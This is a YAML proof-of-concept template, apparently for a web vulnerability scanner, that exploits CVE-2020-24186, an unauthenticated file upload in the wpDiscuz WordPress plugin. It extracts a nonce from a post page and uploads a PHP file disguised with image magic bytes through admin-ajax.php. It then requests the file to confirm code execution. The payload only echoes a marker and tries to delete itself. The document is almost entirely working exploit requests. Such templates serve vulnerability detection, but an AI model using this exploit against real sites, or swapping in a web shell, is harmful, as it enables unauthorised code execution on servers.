name: poc-yaml-wordpress-wpdiscuz-cve-2020-24186-unauthenticated-fileupload
binding: 1315b6bc-f398-4048-acca-ff75ab961b0f
manual: true
detail:
    author: Xz
    links:
        - https://github.com/suncsr/wpDiscuz_unauthenticated_arbitrary_file_upload/blob/main/README.md
        - https://nvd.nist.gov/vuln/detail/CVE-2020-24186
        - https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
        - http://packetstormsecurity.com/files/162983/WordPress-wpDiscuz-7.0.4-Shell-Upload.html
    vulnerability:
        id: CT-45454
        level: critical
    description: WordPress wpDiscuz plugin versions  version 7.0 through 7.0.4 are susceptible to remote code execution. This flaw gave unauthenticated attackers the ability to upload arbitrary files, including PHP files, and achieve remote code execution on a vulnerable site's server.
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    random1: bytes(randomLowercase(10))
    random2: bytes(randomLowercase(10))
    bs4: base64Decode("/9j/4WpFeGlmTU0q/f39af39Pv39/f39/f39/f2o/f39/cD9/f39/f39/f39/f/g/UpGSUb9/f39/9tD/f0M/QwK/f0=")
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /?p=1
        expression: response.status == 200
        output:
            search: '''wmuSecurity":"(?P<sec>.*?)"''.submatch(response.body_string)'
            sec: search["sec"]
    r1:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{random1}}
            body: |
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="action"

                wmuUploadFiles
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="wmu_nonce"

                {{sec}}
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="wmuAttachmentsData"

                undefined
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="wmu_files[0]"; filename="{{random1}}.php"
                Content-Type: image/png

                {{bs4}}
                <?php echo "{{random2}}"; unlink(__FILE__); ?>
                ------WebKitFormBoundary{{random1}}
                Content-Disposition: form-data; name="postId"

                1
                ------WebKitFormBoundary{{random1}}--
        expression: response.status == 200 && response.body.bcontains(b"fullname") && response.body.bcontains(b"shortname") && response.body.bcontains(b"success\":true")
        output:
            search1: '''"http:.*?(?P<url>wp-content.*?)"''.submatch(response.body_string)'
            url: search1["url"]
            url2: replaceAll(url, "\\", "")
    r2:
        request:
            cache: true
            method: GET
            path: /{{url2}}
        expression: response.status == 200 && response.body.bcontains(random2)
expression: r0() && r1() && r2()
